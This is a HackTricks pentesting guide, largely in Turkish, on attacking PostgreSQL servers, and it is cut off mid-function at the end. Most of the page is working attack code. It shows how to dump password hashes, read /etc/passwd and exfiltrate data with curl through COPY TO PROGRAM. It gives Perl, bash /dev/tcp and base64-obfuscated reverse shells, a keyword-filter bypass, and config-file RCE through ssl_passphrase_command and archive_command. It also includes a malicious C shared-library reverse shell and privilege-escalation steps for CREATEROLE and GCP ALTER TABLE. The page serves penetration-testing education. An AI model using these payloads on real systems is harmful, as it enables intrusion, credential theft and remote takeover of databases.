# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Temel Bilgiler**

**PostgreSQL** bir **nesne-ilişkisel veritabanı sistemi** olarak tanımlanır ve **açık kaynaklıdır**. Bu sistem sadece SQL dilini kullanmakla kalmaz, aynı zamanda onu ek özelliklerle genişletir. Bu yetenekleri, çok çeşitli veri türlerini ve işlemleri yönetmesine olanak tanır; bu da geliştiriciler ve kuruluşlar için onu esnek bir seçim haline getirir.

**Default port:** 5432, ve eğer bu port zaten kullanılıyorsa postgresql muhtemelen kullanılmayan bir sonraki portu (muhtemelen 5433) kullanacaktır.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Bağlanma & Temel Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Eğer **`\list`** komutunu çalıştırdığınızda **`rdsadmin`** adında bir veritabanı görürseniz, bir **AWS postgresql database** içinde olduğunuzu bilirsiniz.

Daha fazla bilgi için **PostgreSQL veritabanını nasıl kötüye kullanacağınız** bölümüne bakın:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Otomatik Keşif
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

Bu [**çalışmaya**](https://www.exploit-db.com/papers/13084) göre, bir bağlantı denemesi başarısız olduğunda, `dblink` hata açıklaması içeren `sqlclient_unable_to_establish_sqlconnection` istisnası fırlatır. Bu ayrıntılara örnekler aşağıda listelenmiştir.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Host kapalı

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port kapalı
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Port açık
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
veya
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port açık veya filtrelenmiş
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
PL/pgSQL fonksiyonlarında şu anda istisna ayrıntılarını almak mümkün değildir. Ancak PostgreSQL sunucusuna doğrudan erişiminiz varsa gerekli bilgileri elde edebilirsiniz. Sistem tablolarından kullanıcı adları ve parolaları çıkarmak mümkün değilse, önceki bölümde tartışılan wordlist attack yöntemini kullanmayı düşünebilirsiniz; bu yöntem olumlu sonuç verebilir.

## Yetkilerin Listelenmesi

### Roller

| Rol Türleri    |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Rol superuser ayrıcalıklarına sahiptir                                                                                                               |
| rolinherit     | Rol, üyesi olduğu rollerin ayrıcalıklarını otomatik olarak devralır                                                                                   |
| rolcreaterole  | Rol daha fazla rol oluşturabilir                                                                                                                     |
| rolcreatedb    | Rol veritabanları oluşturabilir                                                                                                                      |
| rolcanlogin    | Rol oturum açabilir. Yani bu role başlangıç oturum yetkilendirme tanımlayıcısı olarak verilebilir                                                     |
| rolreplication | Rol bir replication rolüdür. Bir replication rolü replikasyon bağlantıları başlatabilir ve replication slotları oluşturup silebilir.                   |
| rolconnlimit   | Oturum açabilecek roller için bu, bu rolün yapabileceği eşzamanlı bağlantıların azami sayısını belirler. -1 sınırsız anlamına gelir.                    |
| rolpassword    | Parola değil (her zaman `********` olarak okunur)                                                                                                    |
| rolvaliduntil  | Parola sona erme zamanı (sadece parola doğrulama için kullanılır); sona erme yoksa null                                                              |
| rolbypassrls   | Rol, tüm satır düzeyi güvenlik politikalarını atlar; daha fazla bilgi için [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) bakınız. |
| rolconfig      | Çalışma zamanı yapılandırma değişkenleri için role özgü varsayılanlar                                                                                 |
| oid            | Rolün ID'si                                                                                                                                          |

#### İlginç Gruplar

- Eğer **`pg_execute_server_program`** üyesiyseniz programları çalıştırabilirsiniz
- Eğer **`pg_read_server_files`** üyesiyseniz dosyaları okuyabilirsiniz
- Eğer **`pg_write_server_files`** üyesiyseniz dosyaları yazabilirsiniz

> [!TIP]
> Postgres'te bir **user**, bir **group** ve bir **role** aynıdır. Nasıl kullandığınıza ve ona oturum açma izni verip vermediğinize bağlıdır.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tablolar
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Fonksiyonlar
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Dosya sistemi işlemleri

### Dizinleri ve dosyaları okuma

Bu [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) ile tanımlanan **`DEFAULT_ROLE_READ_SERVER_FILES`** grubunun üyeleri (diğer adıyla **`pg_read_server_files`**) ve **süper kullanıcılar** herhangi bir yol üzerinde **`COPY`** yöntemini kullanabilir (bakınız `convert_and_check_filename` in `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Unutmayın: eğer superuser değilseniz ama **CREATEROLE** yetkisine sahipseniz kendinizi o grubun üyesi yapabilirsiniz:
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Dosya okumak veya bir dizini listelemek için kullanılabilecek **başka postgres fonksiyonları** vardır. Yalnızca **superusers** ve **açık izinlere sahip kullanıcılar** bunları kullanabilir:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Şurada **daha fazla fonksiyon** bulabilirsiniz: [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Basit Dosya Yazma

Yalnızca **süper kullanıcılar** ve **`pg_write_server_files`** üyeleri dosya yazmak için copy komutunu kullanabilir.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Unutmayın: eğer süper kullanıcı değilseniz ama **`CREATEROLE`** iznine sahipseniz **kendinizi o grubun üyesi yapabilirsiniz:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

COPY'un newline karakterleriyle başa çıkamadığını unutmayın; bu nedenle base64 payload kullanıyor olsanız bile **tek satır göndermeniz gerekir**.\
Bu tekniğin çok önemli bir sınırlaması da **`copy`'nin bazı binary değerlerini değiştirdiği için ikili (binary) dosyalar yazmak için kullanılamamasıdır.**

### **Binary files upload**

Ancak, büyük binary dosyaları yüklemek için **başka teknikler** de vardır:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### PostgreSQL tablo verilerini yerel dosya yazma ile güncelleme

Eğer PostgreSQL sunucu dosyalarını okuma ve yazma için gerekli izinlere sahipseniz, [PostgreSQL veri dizinindeki](https://www.postgresql.org/docs/8.1/storage.html) ilişkili file node'u üzerine yazarak sunucudaki herhangi bir tabloyu güncelleyebilirsiniz. Bu teknik hakkında **daha fazlası** [**burada**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Gerekli adımlar:

1.  PostgreSQL veri dizinini elde edin

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Not:** Eğer settings'ten mevcut data directory yolunu alamıyorsanız, `SELECT version()` sorgusuyla PostgreSQL ana sürümünü sorgulayabilir ve yolu brute-force ile tahmin etmeyi deneyebilirsiniz. Unix kurulumlarında yaygın veri dizini yolları `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/` şeklindedir. Yaygın bir cluster adı `main`'dir.

2.  Hedef tabloyla ilişkili filenode için göreli yolu alın

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Bu sorgu `base/3/1337` gibi bir değer döndürmelidir. Disk üzerindeki tam yol `$DATA_DIRECTORY/base/3/1337`, ör. `/var/lib/postgresql/13/main/base/3/1337` olacaktır.

3.  filenode'u `lo_*` fonksiyonlarıyla indirin

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Hedef tabloyla ilişkili veri tipini alın

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor)'ü kullanarak [filenode'u düzenleyin](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); tam izinler için tüm `rol*` boolean bayraklarını 1 olarak ayarlayın.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Düzenlenmiş filenode'u `lo_*` fonksiyonlarıyla tekrar yükleyin ve diskteki orijinal dosyanın üzerine yazın

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(İsteğe bağlı)_ Pahalı bir SQL sorgusu çalıştırarak bellek içi tablo önbelleğini temizleyin

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Artık PostgreSQL'de güncellenmiş tablo değerlerini görmelisiniz.

Ayrıca `pg_authid` tablosunu düzenleyerek süperadmin olabilirsiniz. **Bkz.** [**bir sonraki bölüm**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE to program**

Since[ version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), only **super users** and member of the group **`pg_execute_server_program`** can use copy for RCE (example with exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Çalıştırma örneği:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Eğer super user değilseniz ancak **`CREATEROLE`** izinlerine sahipseniz kendinizi o grubun üyesi yapabilirsiniz:
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Or use the `multi/postgres/postgres_copy_from_program_cmd_exec` module from **metasploit**.\
More information about this vulnerability [**here**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). While reported as CVE-2019-9193, Postges declared this was a [feature and will not be fixed](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Anahtar kelime filtrelerini/WAF'i atlayarak COPY PROGRAM'a ulaşma

SQLi bağlamlarında ardışık sorgular kullanıldığında, bir WAF literal `COPY` anahtar kelimesini kaldırabilir veya engelleyebilir. İfadeyi dinamik olarak oluşturup bir PL/pgSQL DO bloğu içinde çalıştırabilirsiniz. Örneğin, öncü C'yi `CHR(67)` ile oluşturarak basit filtreleri atlayın ve oluşturulmuş komutu EXECUTE edin:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
Bu desen statik anahtar kelime filtrelemesini aşar ve yine de `COPY ... PROGRAM` ile OS komut yürütümü sağlar. Özellikle uygulama SQL hatalarını ekrana yazdırıyor (echoes) ve stacked queries'e izin veriyorsa kullanışlıdır.

### PostgreSQL Dilleri ile RCE


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### PostgreSQL eklentileri ile RCE

Önceki yazıdan **binary dosyaların nasıl yükleneceğini** öğrendiyseniz, bir PostgreSQL extension'ı yükleyip yükleyerek **RCE** elde etmeyi deneyebilirsiniz.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### PostgreSQL konfigürasyon dosyası üzerinden RCE

> [!TIP]
> Aşağıdaki RCE vektörleri, tüm adımların iç içe SELECT ifadeleriyle gerçekleştirilebilmesi nedeniyle kısıtlı SQLi bağlamlarında özellikle kullanışlıdır

PostgreSQL'in **konfigürasyon dosyası**, veritabanını çalıştıran **postgres kullanıcısı** tarafından yazılabilir durumdadır; yani **superuser** olarak dosya sistemine dosya yazabilir ve bu dosyayı **üzerine yazabilirsiniz.**

![](<../images/image (322).png>)

#### **ssl_passphrase_command ile RCE**

Daha fazla bilgi için [bu teknik hakkında](https://pulsesecurity.co.nz/articles/postgres-sqli).

Konfigürasyon dosyasında RCE'ye yol açabilecek bazı ilginç öznitelikler vardır:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Veritabanının özel anahtarının yolu
- `ssl_passphrase_command = ''` Eğer özel dosya parola ile korunuyorsa (şifreliyse) postgresql bu öznitelikte belirtilen **komutu çalıştıracaktır**.
- `ssl_passphrase_command_supports_reload = off` **Bu** öznitelik **on** ise, anahtar parola ile korunuyorsa çalıştırılacak **komut**, `pg_reload_conf()` **çalıştırıldığında** yürütülecektir.

Bunun için bir saldırganın yapması gerekenler:

1. **Özel anahtarı dump edin** sunucudan
2. **İndirilen özel anahtarı şifreleyin:**
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Üzerine yazın**
4. Mevcut postgresql **konfigürasyonunu dump edin**
5. **Konfigürasyonu** bahsedilen özniteliklerle **üzerine yazın:**
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()`'yi çalıştırın

Test ederken bunun yalnızca **özel anahtar dosyasının izinleri 640** ise, **root** tarafından sahiplenilmiş ve **ssl-cert veya postgres grubu**na ait olduğu (böylece postgres kullanıcısı okuyabilir) ve konumunun _/var/lib/postgresql/12/main_ olması halinde çalıştığını fark ettim.

#### **archive_command ile RCE**

**Daha fazla** [**bilgi bu konfigürasyon ve WAL hakkında**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Konfigürasyon dosyasındaki sömürülebilir bir diğer öznitelik `archive_command`'dır.

Bunun çalışması için `archive_mode` ayarının `'on'` veya `'always'` olması gerekir. Bu doğruysa, `archive_command` içindeki komutu üzerine yazabilir ve WAL (write-ahead logging) işlemleri aracılığıyla çalışmasını zorlayabiliriz.

Genel adımlar:

1. archive mode'un etkin olup olmadığını kontrol edin: `SELECT current_setting('archive_mode')`
2. `archive_command`'ı payload ile üzerine yazın. Örneğin, bir reverse shell için: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Konfigürasyonu yeniden yükleyin: `SELECT pg_reload_conf()`
4. WAL işlemini çalıştırmaya zorlayın, bu archive_command'ı çağıracaktır: `SELECT pg_switch_wal()` veya bazı Postgres sürümleri için `SELECT pg_switch_xlog()`

##### Large Objects üzerinden postgresql.conf düzenleme (SQLi-dostu)

Çok satırlı yazma gerektiğinde (ör. birden fazla GUC ayarı yapmak için), PostgreSQL Large Objects kullanarak konfigürasyonu tamamen SQL üzerinden okuyup üzerine yazın. Bu yaklaşım, `COPY` yeni satırları veya binary-güvenli yazıları işleyemediği SQLi bağlamları için idealdir.

Örnek (gerekirse ana sürümü ve yolu ayarlayın, örn. Debian'da sürüm 15):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
Bu, `archive_mode` etkin olduğu sürece `postgres` kullanıcısı olarak `archive_command` aracılığıyla güvenilir bir OS komut çalıştırma sağlar. Pratikte, düşük bir `archive_timeout` ayarlamak, açık bir WAL switch'i gerektirmeden hızlı çağrılara neden olabilir.

#### **RCE with preload libraries**

Bu teknik hakkında daha fazla bilgi için: [buraya bakın](https://adeadfed.com/posts/postgresql-select-only-rce/).

This attack vector takes advantage of the following configuration variables:

- `session_preload_libraries` -- PostgreSQL sunucusu tarafından istemci bağlantısında yüklenecek kütüphaneler.
- `dynamic_library_path` -- PostgreSQL sunucusunun kütüphaneleri arayacağı dizinlerin listesi.

We can set the `dynamic_library_path` value to a directory, writable by the `postgres` user running the database, e.g., `/tmp/` directory, and upload a malicious `.so` object there. Next, we will force the PostgreSQL server to load our newly uploaded library by including it in the `session_preload_libraries` variable.

The attack steps are:

1. Download the original `postgresql.conf`
2. Include the `/tmp/` directory in the `dynamic_library_path` value, e.g. `dynamic_library_path = '/tmp:$libdir'`
3. Include the malicious library name in the `session_preload_libraries` value, e.g. `session_preload_libraries = 'payload.so'`
4. Check major PostgreSQL version via the `SELECT version()` query
5. Compile the malicious library code with the correct PostgreSQL dev package Sample code:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compiling the code:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Upload the malicious `postgresql.conf`, created in steps 2-3, and overwrite the original one
7. Upload the `payload.so` from step 5 to the `/tmp` directory
8. Reload the server configuration by restarting the server or invoking the `SELECT pg_reload_conf()` query
9. At the next DB connection, you will receive the reverse shell connection.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

According to the [**docs**](https://www.postgresql.org/docs/13/sql-grant.html): _**`CREATEROLE`** ayrıcalığına sahip roller, **superuser olmayan** herhangi bir role üyelik **verme veya üyelikten çıkarma** yetkisine sahiptir._

So, if you have **`CREATEROLE`** permission you could grant yourself access to other **roles** (that aren't superuser) that can give you the option to read & write files and execute commands:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Parola Değiştirme

Bu role sahip kullanıcılar ayrıca diğer **süper kullanıcı olmayan** kullanıcıların **parolalarını** **değiştirebilirler**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

**Yerel kullanıcıların herhangi bir password sağlamadan PostgreSQL'e giriş yapabilmesi** oldukça yaygındır. Bu nedenle, bir kez **kod çalıştırma izinlerini** elde ettiğinizde, bu izinleri kötüye kullanarak size **`SUPERUSER`** rolünü verebilirsiniz:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Bu genellikle **`pg_hba.conf`** dosyasındaki aşağıdaki satırlar nedeniyle mümkündür:
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

[**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) içinde kullanıcıya verilen ALTER TABLE ayrıcalığı kötüye kullanılarak Postgres GCP'de nasıl **privesc** yapılabildiği açıklanıyor.

Bir tabloya **başka bir kullanıcıyı sahip yapmak** istediğinizde bunu engelleyen bir **hata** almanız gerekir, ancak görünüşe göre GCP bu **seçeneği superuser olmayan postgres kullanıcısına** vermiş:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Bu düşünceyi, **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) komutları bir **indeks fonksiyonlu tablo** üzerinde çalıştırıldığında, **fonksiyon** komutun bir parçası olarak **çağrılır** ve bu çağrı **tablo** **sahibinin izinleri** ile gerçekleşir gerçeğiyle birleştirirsek: bir index'i bir fonksiyon ile oluşturup o tabloya **super user** için sahiplik izinleri vermek ve ardından zararlı fonksiyonu içeren tablo üzerinde ANALYZE çalıştırmak mümkündür; fonksiyon, sahibin ayrıcalıklarını kullandığı için komutları yürütülebilir.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. Önce yeni bir tablo oluşturun.
2. indeks fonksiyonu için veri sağlamak amacıyla tabloya bazı ilgisiz içerikler ekleyin.
3. Kod yürütme payload'u içeren kötü amaçlı bir indeks fonksiyonu geliştirin; bu, yetkisiz komutların çalıştırılmasına izin verir.
4. Tablonun sahibini ALTER ile "cloudsqladmin" olarak değiştirin; bu, veritabanını yönetmek ve sürdürmek için Cloud SQL tarafından özel olarak kullanılan GCP'nin superuser rolüdür.
5. Tablo üzerinde ANALYZE işlemi gerçekleştirin. Bu işlem PostgreSQL motorunu tablonun sahibi olan "cloudsqladmin" kullanıcısının bağlamına geçmeye zorlar. Sonuç olarak kötü amaçlı indeks fonksiyonu "cloudsqladmin" yetkileriyle çağrılır ve daha önce yetkisiz olan shell komutunun çalıştırılmasını mümkün kılar.

PostgreSQL'de bu akış şu şekilde görünür:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Sonra, `shell_commands_results` tablosu yürütülen kodun çıktısını içerecektir:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Yerel Giriş

Bazı yanlış yapılandırılmış postgresql örnekleri herhangi bir yerel kullanıcının giriş yapmasına izin verebilir; 127.0.0.1 üzerinden yerel olarak bağlanmak **`dblink` fonksiyonu** kullanılarak mümkündür:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Önceki sorgunun çalışması için **`dblink` fonksiyonunun var olması gerektiğini** unutmayın. Eğer yoksa şu şekilde oluşturmaya çalışabilirsiniz
>
> ```sql
> CREATE EXTENSION dblink;
> ```
>
> Daha fazla ayrıcalığa sahip bir kullanıcının şifresine sahipseniz, fakat kullanıcı harici bir IP'den giriş yapmaya izinli değilse, o kullanıcı adına sorgular çalıştırmak için aşağıdaki fonksiyonu kullanabilirsiniz:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Bu fonksiyonun var olup olmadığını şu şekilde kontrol etmek mümkündür:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Özel tanımlı fonksiyon ile** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters IBM tarafından sağlanan bir postgres örneğinde privesc yapabildiler, çünkü **bu fonksiyonu SECURITY DEFINER flag'i ile buldular**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
